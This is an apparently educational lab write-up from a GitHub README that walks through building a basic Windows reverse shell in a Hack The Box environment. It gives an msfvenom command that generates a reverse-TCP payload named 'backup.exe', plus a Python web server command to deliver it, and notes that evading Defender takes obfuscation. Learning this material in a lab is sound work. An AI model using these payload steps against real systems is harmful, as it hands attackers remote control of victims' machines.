# S1-Basic-Reverse-Shell
## Introduce
This is just a basic simulation of a “ReverShell” that I created to reinforce my own understanding. In short, it uses a classic method to send an .exe file to the target machine and then establish a connection back to the attacker's machine from there. From there, we can proceed with the attack.
## Step by step
### Step 1: Building
I’ll use a random target IP from Hack the Box for this example.

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_1.png)

You should also download and set up your own IP address (enable VPN) to practice.

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_2_vpn.png)

*) So assumed configuration is as follows:
Attacker Machine (Pwnbox/Kali): IP 10.10.17.202 (Retrieved from the command `ip a s tun0`).

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_4_tun0.png)

Victim Machine (Windows): Windows Defender is disabled, and the known IP address is: 10.192.5.164
Connection Port: 4444

### Step 2: Create a “Listener” on Kali
Before sending the malware, you must open the door to let it in.

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_3_l%E1%BA%AFng_nghe.png)

Note: Keep this Terminal window open; do not close it.
### Step 3: Creating a malicious payload
Use 'msfvenom' to create an executable file (.exe). This file contains instructions that cause a Windows machine to automatically connect to your IP address.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip-tun0> LPORT=4444 -f exe -o backup.exe`

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_5_weapon.png)

### Step 4:Set up a file download server (Python Web Server)
I will move the file to a separate folder to make testing easier. Like this:

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_6_chuy%E1%BB%83n.png)

To allow your Windows computer to download the ‘backup.exe’ file, turn your current folder into a website: `python3 -m http.server 80`

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_7_tr%E1%BA%A1m_trung_chuy%E1%BB%83n.png)

### Step 5:Connect to Victim Machine (Windows)
We use this command like picture to connect:

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_8_k%E1%BA%BFt_n%E1%BB%91i.png)

And result:
![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_8%2C5.png)

### Step 6:Download and run on a Windows computer
Now, on a Windows machine, you must make sure that Windows Defender is turned off! 
Then open PowerShell and run the following command on picture:

![image alt](https://github.com/ImSAM-S/s1_basic_Reverse_Shell/blob/62353866dca5c41c71b7a35d9e15e0922d1fa0f6/%E1%BA%A3nh_9.png)

And finally is use this to run: `C:\Users\htb-student\desktop\backup.exe`

Now you can do whatever you want on your linux (you have enter the victim system):
It will look like: 
            `connect to [10.10.17.202] from (UNKNOWN) [10.129.5.164] 50123
            Microsoft Windows [Version 10.0.x]
            (c) Microsoft Corporation. All rights reserved.`
            
            `C:\Users\htb-student\desktop>_`

## Learn form project
Reverse Shell Thinking: Understand that to bypass a firewall, you don’t attack head-on (inbound) but trick the victim’s machine into “calling back” on its own (outbound). This is the most basic technique for gaining control.

AV Detection Mechanisms: You’ll see firsthand how Windows Defender blocks files with familiar signatures. To succeed, you must learn obfuscation techniques or write your own code.

Deployment Skills (Staging): You’ll learn how to coordinate a chain of tools: Creation (msfvenom) -> Delivery (Python Server) -> Download (IWR) -> Listening (Netcat).

## Project Files
```tree
S1-Basic-Reverse-Shell/
├── README.md
├── ảnh_1.png
├── ảnh_2_vpn.png
├── ảnh_3_lắng_nghe.png
├── ảnh_4_tun0.png
├── ảnh_5_weapon.png
├── ảnh_6_chuyển.png
├── ảnh_7_trạm_trung_chuyển.png
├── ảnh_8,5.png
├── ảnh_8_kết_nối.png
└── ảnh_9.png
```

## Author
ImSAM-S


